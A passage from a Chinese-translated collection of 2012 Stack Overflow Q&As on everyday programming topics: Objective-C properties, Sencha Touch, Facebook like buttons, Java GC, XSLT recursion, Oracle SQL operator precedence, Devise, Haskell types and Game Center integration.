-0.54431,11.5139 -1.53125,16.5312 5.71636,-1.9046 10.94127,-4.9418 15.4375,-8.8125 0.35653,-2.4981 0.53125,-5.0808 0.53125,-7.7187 0,-22.51023 -13.59198,-40.7813004 -30.34375,-40.7813004 z"       id="path4909"       inkscape:connector-curvature="0" />  </g></svg>';
    img.src = imgStr;
}
</script>
</head>
<body onload='myInit();'>

</body>
</html> 
```

# objective-c - Objective-C：将属性引用传递给方法调用的正确方法

> ID：12760234
> 
> 赞同：3
> 
> 时间：2012-10-06T13:31:51.340
> 
> 标签：objective-c, ios, macos, cocoa

如果我有这样的财产：

```
@property(strong, readwrite, nonatomic) NSDate* aProperty; 
```

我想将引用传递给另一种方法，这些是否正确：

```
if([AnotherClass aMethod:&(self.aProperty)]) { ...
if([AnotherClass aMethod:&self.aProperty]) { ... 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-06T13:39:28.857

您可以使用 KeyValue 编码。

只需将属性名称作为 NSString 发送

```
- (void) method:(NSString*)propertyName
{
  [self setValue:[NSNumber numberWithInt:2] forKey:propertyName];
} 
```

还有一个属性只是方法（设置和获取），所以你可以传递一个选择器

```
SEL selector = @selector(setProperty:);

- (void) method:(SEL)selector target:(id)target
{
  [target performSelector:selector withObject:[NSNumber numberWithInt:2]];
} 
```

我更喜欢使用键值编码。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-10-06T16:07:43.083

考虑到你的例子：

```
if ([AnotherClass aMethod:&(self.aProperty)]) { ... 
```

这显然行不通，因为点表示法实际上是使用 getter 访问器方法。它相当于：

```
if ([AnotherClass aMethod:&[self aProperty]]) { ... 
```

你可以很容易地想象为什么编译器对这个符号有点困惑。合乎逻辑的替代方法是引用 ivar。因此，（假设您对属性的 ivar 使用下划线约定）它可能看起来像：

```
if ([AnotherClass aMethod:&_aProperty]) { ... 
```

但这有各种各样的问题（绕过setter，有关于`aMethod`需要`__strong`属性来覆盖[此处](https://stackoverflow.com/a/7422679/1271826)`__autoreleasing`讨论的默认值等问题）。

所以，最好的办法是有一个接收更新的局部变量，然后调用属性的设置器：

```
NSDate *date;
if ([AnotherClass aMethod:&date]) { ...

self.aProperty = date; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-06T13:38:47.630

```
aProperty 
```

已经是指向 NSDate 对象的指针，因此您只需将指针值传递给“通过引用调用”。

由于项目被声明为指针，您可以使用以下方式传递引用，

```
if([AnotherClass aMethod:aProperty]) { ... 
```

aMethod 的原型在哪里...

```
- (BOOL) aMethod:(NSDate *) aParameter; 
```

（以上是真的，除非你真的想传递一个指向属性本身的指针 - 修改指向属性本身的指针，在这种情况下我会质疑你的设计）

# touch - 如何使用 Sencha Touch 2 获取表单面板和禁用选择字段

> ID：12760235
> 
> 赞同：0
> 
> 时间：2012-10-06T13:31:59.453
> 
> 标签：touch, extjs, formpanel

我试图在应用程序启动时禁用一些选择字段。我的主要导航是一个标签面板，我在这里有一个设置表单：

```
{
                    xtype: 'formpanel',
                    title: 'Einstellungen',
                    iconCls: 'settings',
                    cls: [
                        'settingsPanel'
                    ],
                    id: 'settingsPanel',
                    ui: 'light',
                    layout: {
                        type: 'vbox'
                    },
                    scrollable: false,
                    items: [
                        {
                            xtype: 'selectfield',
                            border: '',
                            cls: [
                                'name1'
                            ],
                            id: 'name1',
                            labelAlign: 'top',
                            autoCapitalize: false,
                            autoComplete: false,
                            placeHolder: '1\. Name eingeben',
                            displayField: 'name',
                            store: 'settingsStore',
                            valueField: 'name'
                        } 
```

现在在控制器的初始化函数中我试试这个：

```
var form = Ext.ComponentQuery.query('formpanel');
form.getAt(0).disable();
form.getAt(1).disable();
form.getAt(2).disable(); 
```

但我得到：

```
Uncaught TypeError: Object [object Object] has no method 'getAt' 
```

如何在控制器中获取表单并禁用选择字段？这可能是范围问题吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-08T06:29:38.287

我已经解决了您的问题并解决了它。以下是两个代码：-

**主导航.js**

```
 {
        xtype: 'fieldset',
        id: 'abc', // give a unique 'id' to your fieldset
        items: [
                {
                    xtype: 'selectfield',
                    border: '',
                    cls: [
                        'name1'
                    ],
                    id: 'name1',
                    labelAlign: 'top',
                    autoCapitalize: false,
                    autoComplete: false,
                    placeHolder: '1\. Name eingeben',
                    displayField: 'name',
                    store: 'settingsStore',
                    valueField: 'name'
                }
           ]
    } 
```

**控制器.js**

```
 launch: function () {
                console.log("launch");
                var form = Ext.getCmp('abc'); // calling fieldset with 'id'
                console.log('Fetching fieldset...');
                form.getAt(0).disable();
            } 
```

希望这可以帮助。

# php - 在 PHP 中操作相机原始文件的替代方法是什么？

> ID：12760236
> 
> 赞同：0
> 
> 时间：2012-10-06T13:32:02.103
> 
> 标签：php, image-processing, dng

我正在重新编码我的个人照片博客，并希望在现场上传和处理照片。

我知道 Imagick（[在 linux/php 中将 RAW 照片转换为 JPEG](https://stackoverflow.com/questions/10558487/convert-raw-photos-to-jpeg-in-linux-php)）是一个选项，但我想知道是否还有其他选项可以让 PHP 操作和转换相机原始图像（crw、dng 等）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:55:51.983

如果您需要最佳 RAW 功能，请使用开源命令行实用程序[dcraw](http://www.cybercom.net/~dcoffin/dcraw/)。

许多 linux RAW 工具也在使用它。

# php - 使用带有查询字符串的 facebook like 按钮 - like 按钮不起作用

> ID：12760237
> 
> 赞同：1
> 
> 时间：2012-10-06T13:32:06.620
> 
> 标签：php, javascript, facebook

我正在将 facebook Like 按钮和 Comments API 合并到我的网站中（终于）。现在在我的网站上，我有一个页面使用查询字符串来确定正确的内容（我的网站有超过 4000 个条目，我们使用这个查询字符串）。因此对于用户来说，这一页看起来很多，这样想……

```
productPage.php?productID=1234 
```

现在我可以毫无问题地添加评论 API，它可以区分 URL/查询字符串的差异，这很棒。然而，Like 按钮不起作用。您单击它，它会闪烁并返回到原来的样子（它不会注册“赞”）。我正在正确编码 URL（见下文）

```
<?php
   $fbUrl = urlencode("https://" . $_SERVER["HTTP_HOST"] . $_SERVER['REQUEST_URI']);
   // echo "this page is " .  $fbUrl;
?>

<script>

 window.fbAsyncInit = function() {
        FB.init({
          appId      : 'XXXXXXXXXXXXXXXXX', // App ID
          channelUrl : '//www.myURL.co.uk/channel.php', // Channel File
          status     : true, // check login status
          cookie     : true, // enable cookies to allow the server to access the session
          xfbml      : true  // parse XFBML
        });

        // Additional initialization code here
      };

</script>

Oh I love this content....
<br><br>

<div id="fb-root"></div>
<script>
 (function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s); js.id = id;
    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=205472122918257";
    fjs.parentNode.insertBefore(js, fjs);
 }(document, 'script', 'facebook-jssdk'));
</script>

<div class="fb-like" data-href="<?php echo $fbUrl; ?>" data-send="true" data-width="450" data-show-faces="false"></div>
<br><br>
and add a comment...
<br><br>
<div class="fb-comments" data-href="<?php echo $fbUrl; ?>" data-num-posts="2" data-width="470" data-colorscheme="dark"></div> 
```

我已经为此花了几个小时，并注意到其他人也遭受了这种痛苦，但是似乎没有人有解决方案。当我在网上寻找解决方案时，有没有人解决过这个问题或遇到过这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-29T01:02:16.050

参考：

[https://developers.facebook.com/docs/reference/plugins/like/](https://developers.facebook.com/docs/reference/plugins/like/)（在“赞”按钮上）

和

[https://developers.facebook.com/docs/reference/javascript/](https://developers.facebook.com/docs/reference/javascript/)（在 FB JavascriptSDK 上）

这里的不同之处在于脚本的重新排序。此外，此示例中还包含 XFBML（作为您使用的 HTML5 方法的替代方法）。

```
<html xmlns:fb="http://ogp.me/ns/fb#">
<head>....</head>
<body>
    <div id="fb-root"></div>
    <script>
      window.fbAsyncInit = function() {
        // init the FB JS SDK
        FB.init({
          appId      : 'YOUR_APP_ID',                        // App ID from the app dashboard
          channelUrl : '//WWW.YOUR_DOMAIN.COM/channel.html', // Channel file for x-domain comms
          status     : true,                                 // Check Facebook Login status
          xfbml      : true                                  // Look for social plugins on the page
        });

        // Additional initialization code such as adding Event Listeners goes here
      };

      // Load the SDK asynchronously
      (function(d, s, id){
         var js, fjs = d.getElementsByTagName(s)[0];
         if (d.getElementById(id)) {return;}
         js = d.createElement(s); js.id = id;
         js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId='YOUR APP ID'";
         fjs.parentNode.insertBefore(js, fjs);
       }(document, 'script', 'facebook-jssdk'));
    </script>

    <fb:like href="<?php echo $fbUrl; ?>" send="true" width="450" show_faces="true"></fb:like>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-26T19:14:05.250

您是否使用开放图形调试器检查过您的页面？

[https://developers.facebook.com/tools/debug](https://developers.facebook.com/tools/debug)

# java - 即使堆上有可用空间，也会发生完全 GC

> ID：12760246
> 
> 赞同：-2
> 
> 时间：2012-10-06T13:34:06.900
> 
> 标签：java, garbage-collection

为什么即使young gen、tenured gen 和perm gen 有可用空间，也会每4000 秒发生一次full gc。

GC参数：

```
-XX:CMSInitiatingOccupancyFraction=50  
-XX:+UseCMSInitiatingOccupancyOnly  
-XX:+UseConcMarkSweepGC  
-XX:+UseParNewGC  
-Xloggc:GC.log  
-XX:+PrintGCDetails  
-XX:+PrintTenuringDistribution  
-XX:MaxTenuringThreshold=8  
-XX:PermSize=128M  
-XX:MaxPermSize=128M  
-XX:+CMSPermGenSweepingEnabled 
```

jvm参数：

-Xms25G -Xmx25G

gc 日志是：

```
22463.534: [GC 22463.534: [ParNew
Desired survivor size 8716288 bytes, new threshold 3 (max 8)
- age   1:    3725848 bytes,    3725848 total
- age   2:    3199384 bytes,    6925232 total
- age   3:    2962800 bytes,    9888032 total
: 150702K->15367K(153344K), 0.0343470 secs] 5647083K->5515157K(26197376K), 0.0344540 secs] [Times: user=0.21 sys=0.00, real=0.04 secs]
22476.236: [GC 22476.236: [ParNew
Desired survivor size 8716288 bytes, new threshold 3 (max 8)
- age   1:    4130920 bytes,    4130920 total
- age   2:    3110336 bytes,    7241256 total
- age   3:    3125208 bytes,   10366464 total
: 151687K->16210K(153344K), 0.0357830 secs] 5651477K->5519299K(26197376K), 0.0358820 secs] [Times: user=0.22 sys=0.00, real=0.04 secs]

**22478.730: [Full GC (System) 22478.730: [CMS: 5503089K->4624468K(26044032K), 33.8259070 secs] 5560326K->4624468K(26197376K), [CMS Perm : 12045K->11957K(131072K)], 33.8260340 secs] [Times: user=33.38 sys=0.06, real=33.83 secs]**

22513.164: [GC 22513.164: [ParNew
Desired survivor size 8716288 bytes, new threshold 8 (max 8)
- age   1:    4477888 bytes,    4477888 total
: 136320K->9674K(153344K), 0.0734160 secs] 4760788K->4634143K(26197376K), 0.0735590 secs] [Times: user=0.55 sys=0.00, real=0.08 secs] 
22522.765: [GC 22522.766: [ParNew
Desired survivor size 8716288 bytes, new threshold 8 (max 8)
- age   1:    3725528 bytes,    3725528 total
- age   2:    4220800 bytes,    7946328 total
: 145994K->8939K(153344K), 0.0226740 secs] 4770463K->4633407K(26197376K), 0.0228130 secs] [Times: user=0.15 sys=0.00, real=0.03 secs] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:00:01.067

一种可能的解释是`System.gc()`定期调用某些东西。它可能是您的代码，也可能是您正在使用的库代码；例如[，由核心 API 调用的 System.gc()](https://stackoverflow.com/questions/6941802/system-gc-calls-by-core-apis)。

`java`您可以通过设置告诉 JVM 忽略调用的选项来测试这个理论`System.gc()`，并查看完整的 GC 是否停止发生。（我提到的选项是`-XX:+DisableExplicitGC`......谢谢弗兰克。）

# xml - 什么是 XML 在消息传递协议中的用途

> ID：12760248
> 
> 赞同：-1
> 
> 时间：2012-10-06T13:34:46.330
> 
> 标签：xml, protocols, messaging

我无法理解 XML 在消息传递协议中的用途。我的一位朋友告诉我找出答案。有人可以举个例子吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T20:00:03.730

最流行的依赖 XML 的协议是基于[SOAP](http://en.wikipedia.org/wiki/SOAP)的 Web 服务。如今，SOAP 正在很大程度上被基于[REST](http://en.wikipedia.org/wiki/Representational_state_transfer)的 Web 服务和 XML 格式的消息负载所取代，而这些负载被使用[JSON](http://www.json.org/)格式的数据所取代。

在我看来，这种变化是由于希望简化一套变得过于复杂的标准。虽然我错过了消息验证（可能使用 XML 模式）之类的功能，但必须承认 JSON 在编码和解析数据结构方面效率更高。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T13:48:02.813

在协议中使用 XML 将是：

*   定义明确的标准
*   大量支持创建、验证和解析 XML
*   自我记录和人类可读（用于调试）
*   不依赖于平台，因此它可以在任何系统之间传输

# recursion - 将模板重新应用到 XSLT 中其他模板的输出

> ID：12760249
> 
> 赞同：0
> 
> 时间：2012-10-06T13:34:54.823
> 
> 标签：recursion, xslt-1.0

以下应该是简单或不可能做到的，但现在我不知道怎么做，所以我问。在我的 XSLT 中，我有生成元素的模板，然后应该再次对其进行转换。更精确的是，每当模板输出原始输入中将要进行转换的元素时，它应该再次进行转换。因此，无限循环是可能的，但要通过仔细设计模板来避免。举个例子：

输入.xml

```
<?xml version="1.0" encoding="utf-8" ?>
<example>
    <a />
    <b />
</example> 
```

变换.xsl

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:transform version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="@*|node()"><xsl:copy>
        <xsl:apply-templates select="@*|node()" />
    </xsl:copy></xsl:template>

    <xsl:template match="a">a</xsl:template>

    <xsl:template match="b">
        <B>b <a /></B>
    </xsl:template>
</xsl:transform> 
```

当前输出.xml

```
<?xml version="1.0"?>
<example>
    a
    <B>b <a/></B>
</example> 
```

所需的输出.xml

```
<?xml version="1.0"?>
<example>
    a
    <B>b a</B>
</example> 
```

如果有的话，通过一次转换来实现这一目标的最佳解决方案是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T18:25:30.147

**这是产生所需结果*的两遍***转换：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:ext="http://exslt.org/common" exclude-result-prefixes="ext">

 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="@*|node()" name="identity">
   <xsl:copy>
     <xsl:apply-templates select="@*|node()" />
   </xsl:copy>
 </xsl:template>

 <xsl:template match="/">
  <xsl:variable name="vrtfPass1">
    <xsl:apply-templates/>
  </xsl:variable>

  <xsl:variable name="vPass1" select="ext:node-set($vrtfPass1)/*"/>

  <xsl:apply-templates select="$vPass1" mode="pass2"/>
 </xsl:template>

 <xsl:template match="content">
   <wrapper>
     <replace />
     <xsl:apply-templates select="@*|node()" />
   </wrapper>
 </xsl:template>

 <xsl:template match="replace">
  <xsl:text>&#xA;Hello world&#xA;</xsl:text>
 </xsl:template>

 <xsl:template match="@*|node()" mode="pass2">
  <xsl:call-template name="identity"/>
 </xsl:template>
</xsl:stylesheet> 
```

**应用于提供的 XML 文档时**：

```
<example>
    <content>Lorem ipsum</content>
    <content><replace /></content>
</example> 
```

**产生了想要的正确结果**：

```
<example>
   <wrapper>
Hello world
Lorem ipsum</wrapper>
   <wrapper>
Hello world

Hello world
</wrapper>
</example> 
```

**请注意**：

在 XSLT 1.0 中，应用模板的结果是臭名昭著的 RTF（结果树片段）类型，根据定义，它不能被进一步访问和处理，除非使用`xsl:copy-of`标准字符串函数。

这就是为什么几乎每个 XSLT 1.0 处理器都提供了一个特定于供应商的扩展函数`xxx:node-set()`，该函数接受一个 RTF 并将其转换为一个“常规”树，可以使用任何 XPath 表达式访问其后代。此处的`xxx`前缀必须绑定到供应商特定的命名空间 uri。

EXSLT`ext:node-set()`由大多数 XSLT 处理器实现——因此它的使用保证了不同 XSLT 处理器之间的可移植性。

**有关其他多通道转换示例，请参见**：

[https://stackoverflow.com/a/3200026/36305](https://stackoverflow.com/a/3200026/36305)

**这**：

[http://www.dpawson.co.uk/xsl/sect1/N169.html#d860e392](http://www.dpawson.co.uk/xsl/sect1/N169.html#d860e392)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-07T19:09:59.243

它并非在所有情况下都有效，但是有一种非常简单的方法可以实现您的要求。你需要做的就是给你的`replace`模板一个名字，然后用`xsl:call-template`. 这只需要对现有样式表进行一些小的更改：

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:transform version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="@*|node()"><xsl:copy>
        <xsl:apply-templates select="@*|node()" />
    </xsl:copy></xsl:template>

    <xsl:template match="content">
        <wrapper>
            <xsl:call-template name="replace"/>
            <xsl:apply-templates select="@*|node()" />
        </wrapper>
    </xsl:template>

    <xsl:template match="replace" name="replace">
        Hello world
    </xsl:template>
</xsl:transform> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-07T22:12:11.317

根据其他答案的输入，我想出了解决我的问题的方法。考虑作为更合适的示例输入：

```
<?xml version="1.0" encoding="utf-8" ?>
<example>
    <a />
    <b />
    <c />
</example> 
```

元素`<a />`,`<b />`和`<c />`的使用与`<replace />`我的原始示例一样，但如转换中所示，它们的每个模板都包含对它们的进一步引用：

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:transform version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:ext="http://exslt.org/common"
exclude-result-prefixes="ext">

    <xsl:template match="@*|node()">
        <xsl:variable name="this">
            <xsl:apply-templates select="." mode="normal" />
        </xsl:variable>
        <xsl:apply-templates select="ext:node-set($this)" mode="normal" />
    </xsl:template>

    <xsl:template match="@*|node()" mode="normal">
        <xsl:copy><xsl:apply-templates select="@*|node()" /></xsl:copy>
    </xsl:template>

    <xsl:template match="a" mode="normal">a</xsl:template>

    <xsl:template match="b" mode="normal">
        <B>b <a /></B>
    </xsl:template>

    <xsl:template match="c" mode="normal">
        <C>c <b /></C>
    </xsl:template>
</xsl:transform> 
```

当应用于示例输入时，此转换会产生我想要的结果：

```
<?xml version="1.0"?>
<example>
    a
    <B>b a</B>
    <C>c <B>b a</B></C>
</example> 
```

显然所有递归引用都已解决。尽管它使用一些更复杂的示例进行了测试，但我不确定它是否适用于所有情况。

这背后的想法如下：前两个模板用于复制。一个`mode="normal"`是一个简单的身份转换，一个没有做递归。使用模式是为了防止递归模板中的无限循环。

请告诉我，您对此有何看法以及其中是否存在明显缺陷！

# sql - SQL 集合运算符

> ID：12760250
> 
> 赞同：0
> 
> 时间：2012-10-06T13:34:57.157
> 
> 标签：sql

这是在 sql oracle 中使用 ONLY 集合运算符完成的，NOT IN、IN、NOT EXISTS、EXISTS、ANY、ALL。

数据库是：

```
Department(DeptNum, Descrip, Instname, DeptName, State, Postcode)
Academic(AcNum, DeptNum*, FamName, GiveName, Initials, Title)
Paper(PaNum, Title)
Author(PaNum*, AcNum*)
Field(FieldNum, ID, Title)
Interest(FieldNum*, AcNum*, Descrip) 
```

问题是：

查找昆士兰州（昆士兰州或昆士兰州）没有人撰写过论文的部门的部门编号、描述和机构名称。

我目前的尝试是找出根本没有人撰写论文的部门，无论他们来自哪个州

```
SELECT department.deptNum, department.state, department.instname
FROM department, academic
WHERE department.deptnum = academic.deptnum
  AND NOT EXISTS
    (SELECT * 
    FROM author 
    WHERE acnum = academic.acnum); 
```

但显然它应该只返回 1 个元组。我得到 3 1 其中是 QLD。如果我尝试通过添加删除其他 2

```
 AND department.state = 'QLD' OR department.state = 'Qld' 
```

在 WHERE 子句和 AND NOT EXISTS 之间，我得到了太多结果。

谁能指导我解决问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:43:31.480

`AND`比 绑定得更紧`OR`，所以

```
A and B or C 
```

被解释为

```
(A and B) or C 
```

不是

```
A and (B or C) 
```

所以你需要放括号。或者你可以使用`in`：

```
AND department.state IN ('QLD', 'Qld') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T13:45:12.130

这是错误的：

```
WHERE department.deptnum = academic.deptnum 
AND department.state = 'QLD' 
OR department.state = 'Qld' 
```

因为它返回： 1\. 按第一个和第二个条件过滤的数据 2\. 按第三个条件过滤的数据，没有“department.deptnum = Academic.deptnum”条件。

想想括号。

你应该这样做：

```
WHERE department.deptnum = academic.deptnum 
AND (department.state = 'QLD' OR department.state = 'Qld') 
```

或者像这样：

```
WHERE department.deptnum = academic.deptnum 
AND upper(department.state) = 'QLD' 
```

UPPER('string') 是与 8i 和更新版本兼容的 Oracle/PLSQL 函数，它将所有字符更改为大写。

最后一个选项是最好的，因为数据可能包含“Qld”、“qld”和“QLD”（大小写的任意组合）。

为了更好地查看数据，您还可以在此处使用 upper('string')：

```
SELECT department.deptNum, upper(department.state), department.deptname 
```

编辑 - 回答评论#1。

“不存在”对于不同的数据行来说是个坏主意。

您的主要选择有 3 列：department.deptNum、department.state、department.instname 您用于按作者过滤的选择有 2 列。

试试这个解决方案：

```
SELECT 
    department.deptNum, 
    department.state, 
    department.instname

FROM 
    department, 
    academic
WHERE 
    department.deptnum = academic.deptnum AND 
    upper(department.state) = 'QLD' AND
    (SELECT count(*) FROM author WHERE acnum = academic.acnum) = 0; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T15:20:58.030

我已经弄清楚如何获得其他部门。

我移除了自然连接并将其全部分解。

首先，我从部门表中获取我想要显示的属性。然后我过滤掉结果只显示QLD/Qld。然后我使用了一个“NOT IN”作为我指向学术表的链接，然后嵌套了另一个“IN”集合运算符来链接到作者表。截止日期过去后，我将发布完整的解决方案。

但几乎唯一对我有帮助的就是一点一点地去做。自然加入真的让我对这一切的想法感到困惑。

# ruby-on-rails - 阻止用户、管理员登录 - Rails Devise

> ID：12760253
> 
> 赞同：1
> 
> 时间：2012-10-06T13:35:06.287
> 
> 标签：ruby-on-rails, authentication, devise

我正在尝试使用仪表板控制器中的设计阻止用户、管理员、代理 - 我收到此错误：

> DashboardController:Class 的未定义局部变量或方法“current_admin”

```
class DashboardController < ApplicationController
  if current_admin.present?
    before_filter :blocked_admin?
  elsif current_agent.present?
    before_filter :blocked_agent?
  elsif current_user.present?
    before_filter :blocked_user?
  end

  def blocked_admin?
    if current_admin.present? && current_admin.blocked_admin?
      sign_out current_admin
      redirect_to root_path, :notice => "This account has been Blocked - Please Contact Admin"
    end
  end

  def blocked_agent?
    if current_agent.present? && current_agent.blocked_agent?
      sign_out current_agent
      redirect_to root_path, :notice => "This account has been Blocked - Please Contact Admin"
    end
  end

  def blocked_user?
    if current_user.present? && current_user.blocked_user?
      sign_out current_user
      redirect_to root_path, :notice => "This account has been Blocked - Please Contact Admin"
    end
  end

end 
```

我是 Rails 新手，优化（DRY）代码的最佳方法是什么。并解决我上面提到的错误。

我也尝试这样做，我以不同的方式将它放在“应用程序控制器”中。我在删除此行之前遇到的错误：

```
redirect_to root_path, :notice => "This account has been Blocked - Please Contact Admin" 
```

> 在此操作中多次调用渲染和/或重定向。请注意，您只能调用渲染或重定向，并且每个操作最多调用一次。另请注意，重定向和渲染都不会终止操作的执行，因此如果您想在重定向后退出操作，则需要执行“redirect_to(...) and return”之类的操作。

删除此行后

```
redirect_to root_path, :notice => "This account has been Blocked - Please Contact Admin" 
```

> TrueClass:Class 的未定义方法“model_name”

```
 def after_sign_in_path_for(resource)
    if resource.is_a?(Admin) && resource.blocked_admin?
      sign_out current_admin
      redirect_to root_path, :notice => "This account has been Blocked - Please Contact Admin"
    elsif resource.is_a?(Agent) && resource.blocked_agent?
      sign_out current_agent
      redirect_to root_path, :notice => "This account has been Blocked - Please Contact Admin"
    elsif resource.is_a?(Agent) && resource.blocked_agent?
      sign_out current_user
      redirect_to root_path, :notice => "This account has been Blocked - Please Contact Admin"
    else
      #super
      "/dashboard"
    end
  end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:10:39.480

我建议您考虑使用像[cancan](https://github.com/ryanb/cancan)这样的外部 gem进行身份验证。有非常有用的文档/截屏视频可用。如果您认为它不适合您的需要，您可以随时[在此处](https://www.ruby-toolbox.com/categories/rails_authorization)查看可用的工具。您也可以尝试执行以下操作：

在您的 application_controller.rb 中：

```
before_filter :check_for_blocking

def check_for_blocking
  if current_user.blocked?
    sign_out current_user
    redirect_to root_path, :notice => "This account has been Blocked - Please Contact Admin"
  end
end 
```

您将面临的主要问题是将 current_admin、current_agent 统一为 current_user。您需要角色管理 - cancan 或其他类似的角色身份验证 gem 提供。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-07T10:44:40.403

尝试添加这三行

```
before_filter :authenticate_user!
before_filter :authenticate_admin!
before_filter :authenticate_agent! 
```

# haskell - 为变量表示创建数据类型，由所有字母 a..z、小写或大写表示

> ID：12760255
> 
> 赞同：1
> 
> 时间：2012-10-06T13:35:21.623
> 
> 标签：haskell, types

我想创建一个表示变量的数据类型 Var。变量是a、b、c...z、小写或大写的字符。

我可以这样写：

```
data Var = A | B | C -- continues to Z 
```

但我不能这样写：

```
data Var = a | b | c -- continues to z 
```

大概是因为它们是小写的。有没有一种优雅的方法来制作这种数据类型？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T14:09:50.793

一种解决方案是简单地拥有

```
data Var = Var Char 
```

虽然`Var 'c'`并且`Var 'D'`将根据需要填充类型，但不幸`Var '%'`的是也可以填充它。有两种方法可以解决此问题。一种是像您一样枚举所有构造函数：

```
data Var = A | B | C -- continues to Z
         | SmallA | SmallB | SmallC -- continues to z 
```

仅让正确值进入类型的另一种方法是使用[智能构造函数](http://www.haskell.org/haskellwiki/Smart_constructors)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-06T14:08:06.330

不，没有 - 正如你所说，它们必须是大写的。

我会去

```
data Var = Var_A | Var_B | ... | Var_Z 
         | Var_a | Var_b | ... | Var_z 
```

或`V_A | V_B`等等。

另一种方法是使用

```
newtype Var = Var Char 
```

但这会失去一些安全性，但实际上是为了阅读和展示。您必须确保在您的代码中没有无效`Char`的 s 以 s 结尾`Var`。

(`data Var_A | ...`是很多样板代码，所以你可以只做 A 到 D，并编写只处理这些字母的代码，然后给自己设置一个小练习来编写一个 Haskell 程序来编写数据类型的源代码和解析为您提供功能！通过这样做，您将了解一些有关 Haskell 中的字符串操作的知识。）

*（（有模板 Haskell 之类的东西旨在为您完成样板工作，但它相当先进，您应该先学习字符串操作。另外，当我谈到这个话题时，一旦您真正知道自己在做什么做，看看 Scrap Your Boilerplate，这是一组非常先进的技术，用于编写好的、聪明的代码。不过，在你开始之前，你需要更多的 Haskell 经验。））*

# python - 从多个线程存储数据

> ID：12760257
> 
> 赞同：0
> 
> 时间：2012-10-06T13:36:23.523
> 
> 标签：python, django

通过 ajax 多上传器 (http://github.com/valums/file-uploader) 上传文件（图像）。每个上传的文件都保存在临时文件中。将临时文件名放入带有原始名称键的 dict 中。稍后，每个图像都将调整为多种尺寸并保存到 s3 存储中。问题是上传时至少有 2 个 dict 实例，不包括文件名集，所以最后我得到了部分 dict。我如何或在哪里存储字典以从任何线程更新它们。尝试使用锁定全局（在某处读取，全局变量可以从所有线程访问） - 不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:55:03.050

有关如何*通过多上传器上传文件*的架构方面的更多信息将对您的问题非常有帮助。

然而，在使用 Python/Django 进行 Web 应用程序时，IMO 应该始终回避*全局数据结构。*为什么？

Django`fcgi`和类似设置旨在与服务于最终 Web 服务器（通常是 Apache/Nginx）的多个进程一起运行，我不知道有什么方法可以在这些进程之间安全一致地共享数据；IMO 该体系结构不适合此目的，而是为*并行*工作（满足请求）而构建的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-14T15:39:27.887

用过**Redis**。它是线程安全的。

# iphone - 用于 iPhone 的 coco2d 中的游戏中心集成

> ID：12760258
> 
> 赞同：1
> 
> 时间：2012-10-06T13:37:04.820
> 
> 标签：iphone, cocos2d-iphone

我有这段代码用于在视图中显示排行榜

。H

```
UIViewController *presentingViewController;
{

@property (retain) UIViewController *presentingViewController; 
```

.m

```
- (void)leaderboardViewControllerDidFinish:(GKLeaderboardViewController *)viewController
{
    [presentingViewController dismissModalViewControllerAnimated:YES];
    [self.presentingViewController.view removeFromSuperview];
}
- (void)leaderboard
{

        GKLeaderboardViewController *lb = [[GKLeaderboardViewController alloc] init];
        if(lb != nil){
            lb.leaderboardDelegate = self;
            presentingViewController = [[UIViewController alloc] init];
            [[[[CCDirector sharedDirector] openGLView] window] addSubview:presentingViewController.view];
            [presentingViewController presentModalViewController:lb animated:YES]; 
```

}

一切都很好，它显示了排行榜，当我点击完成按钮时它会消失，但是我再次点击游戏中心按钮，排行榜没有出来，我们也无法浏览其他页面。

我上面的代码有什么问题，这是针对 iphone cocos2d 应用程序的

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:46:43.810

我在 cocos2D 游戏中使用了这段代码，效果很好，

```
-(void)displayLeaderboard
{
    GKLeaderboardViewController *leaderboardViewController = [[GKLeaderboardViewController alloc] init];
    leaderboardViewController.leaderboardDelegate = self;

    AppController *app = (AppController*) [[UIApplication sharedApplication] delegate];

    [app.navController presentModalViewController:leaderboardViewController animated:YES];
}

#pragma mark GameKit delegate

-(void) achievementViewControllerDidFinish:(GKAchievementViewController *)viewController
{
    AppController *app = (AppController*) [[UIApplication sharedApplication] delegate];
    [app.navController dismissModalViewControllerAnimated:YES];
}

-(void) leaderboardViewControllerDidFinish:(GKLeaderboardViewController *)viewController
{
